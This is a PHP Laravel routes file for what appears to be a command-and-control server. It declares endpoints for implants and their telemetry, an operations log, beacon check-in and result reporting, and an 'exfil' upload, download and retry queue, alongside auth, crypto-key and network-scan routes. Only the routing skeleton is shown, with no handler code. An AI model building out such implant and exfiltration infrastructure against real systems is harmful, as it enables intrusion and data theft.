<?php

use App\Http\Controllers\Api\NodeStatusController;
use App\Http\Controllers\Api\OverviewController;
use App\Http\Controllers\Api\FeedsController;
use App\Http\Controllers\Api\SystemController;
use App\Http\Controllers\Api\NetworkController;
use App\Http\Controllers\Api\CryptoController;
use App\Http\Controllers\Api\AuthController;
use App\Http\Controllers\Api\BeaconController;
use App\Http\Controllers\Api\ExfilController;
use Illuminate\Support\Facades\Route;

Route::prefix('node')->group(function () {
    Route::get('/status', [\App\Http\Controllers\Api\NetworkController::class, 'status'])->name('api.node.status');
    Route::get('/telemetry', [NodeStatusController::class, 'telemetry'])->name('api.node.telemetry');
});

Route::get('/overview', [OverviewController::class, 'overview'])->name('api.overview');
Route::get('/health', [FeedsController::class, 'health'])->name('api.health');
Route::get('/stats', [FeedsController::class, 'stats'])->name('api.stats');
Route::get('/implants', [FeedsController::class, 'implants'])->name('api.implants');
Route::get('/ops/log', [FeedsController::class, 'opsLog'])->name('api.ops.log');
Route::get('/implant/{id}/telemetry', [FeedsController::class, 'implantTelemetry'])->name('api.implant.telemetry');

Route::prefix('system')->group(function () {
    Route::get('/config', [SystemController::class, 'config'])->name('api.system.config');
    Route::get('/modules', [SystemController::class, 'modules'])->name('api.system.modules');
    Route::get('/tasks', [SystemController::class, 'tasks'])->name('api.system.tasks');
    Route::get('/queue', [SystemController::class, 'queue'])->name('api.system.queue');
    Route::get('/logs', [SystemController::class, 'logs'])->name('api.system.logs');
    Route::post('/backup', [SystemController::class, 'backup'])->name('api.system.backup');
    Route::post('/restore', [SystemController::class, 'restore'])->name('api.system.restore');
    Route::get('/audit', [SystemController::class, 'audit'])->name('api.system.audit');
});

Route::prefix('network')->group(function () {
    Route::get('/topology', [NetworkController::class, 'topology'])->name('api.network.topology');
    Route::get('/routes', [NetworkController::class, 'routes'])->name('api.network.routes');
    Route::get('/connections', [NetworkController::class, 'connections'])->name('api.network.connections');
    Route::get('/dns', [NetworkController::class, 'dns'])->name('api.network.dns');
    Route::get('/firewall', [NetworkController::class, 'firewall'])->name('api.network.firewall');
    Route::post('/scan', [NetworkController::class, 'scan'])->name('api.network.scan');
});

Route::prefix('crypto')->group(function () {
    Route::get('/status', [CryptoController::class, 'status'])->name('api.crypto.status');
    Route::get('/keys', [CryptoController::class, 'keys'])->name('api.crypto.keys');
    Route::post('/rotate', [CryptoController::class, 'rotate'])->name('api.crypto.rotate');
    Route::get('/certificates', [CryptoController::class, 'certificates'])->name('api.crypto.certificates');
    Route::post('/verify', [CryptoController::class, 'verify'])->name('api.crypto.verify');
});

Route::prefix('auth')->group(function () {
    Route::post('/login', [AuthController::class, 'login'])->name('api.auth.login');
    Route::post('/logout', [AuthController::class, 'logout'])->name('api.auth.logout');
    Route::post('/token', [AuthController::class, 'token'])->name('api.auth.token');
    Route::post('/refresh', [AuthController::class, 'refresh'])->name('api.auth.refresh');
    Route::get('/sessions', [AuthController::class, 'sessions'])->name('api.auth.sessions');
    Route::post('/revoke', [AuthController::class, 'revoke'])->name('api.auth.revoke');
    Route::get('/permissions', [AuthController::class, 'permissions'])->name('api.auth.permissions');
    Route::post('/mfa', [AuthController::class, 'mfa'])->name('api.auth.mfa');
});

Route::prefix('beacon')->group(function () {
    Route::post('/checkin', [BeaconController::class, 'checkin'])->name('api.beacon.checkin');
    Route::post('/result', [BeaconController::class, 'result'])->name('api.beacon.result');
    Route::get('/heartbeat', [BeaconController::class, 'heartbeat'])->name('api.beacon.heartbeat');
    Route::post('/register', [BeaconController::class, 'register'])->name('api.beacon.register');
    Route::post('/deregister', [BeaconController::class, 'deregister'])->name('api.beacon.deregister');
    Route::get('/config', [BeaconController::class, 'config'])->name('api.beacon.config');
});

Route::prefix('exfil')->group(function () {
    Route::post('/upload', [ExfilController::class, 'upload'])->name('api.exfil.upload');
    Route::get('/download', [ExfilController::class, 'download'])->name('api.exfil.download');
    Route::get('/status', [ExfilController::class, 'status'])->name('api.exfil.status');
    Route::get('/queue', [ExfilController::class, 'queue'])->name('api.exfil.queue');
    Route::post('/cancel', [ExfilController::class, 'cancel'])->name('api.exfil.cancel');
    Route::post('/retry', [ExfilController::class, 'retry'])->name('api.exfil.retry');
});

Route::prefix('v1')->group(function () {
    Route::get('/ping', fn() => response()->json(['pong' => true, 'ts' => time()]));
    Route::get('/version', fn() => response()->json(['version' => '3.2.1', 'api' => 'v1']));
});

Route::prefix('v2')->group(function () {
    Route::get('/ping', fn() => response()->json(['pong' => true, 'ts' => time(), 'v' => 2]));
    Route::get('/version', fn() => response()->json(['version' => '3.2.1', 'api' => 'v2']));
});

Route::prefix('internal')->group(function () {
    Route::any('/{path?}', fn() => response()->json(['error' => 'Internal endpoint', 'code' => 'ACCESS_DENIED'], 403))->where('path', '.*');
});

Route::prefix('admin')->group(function () {
    Route::any('/{path?}', fn() => response()->json(['error' => 'Admin access denied', 'code' => 'FORBIDDEN'], 403))->where('path', '.*');
});

Route::prefix('debug')->group(function () {
    Route::any('/{path?}', fn() => response()->json(['error' => 'Debug endpoints disabled', 'code' => 'DISABLED'], 400))->where('path', '.*');
});
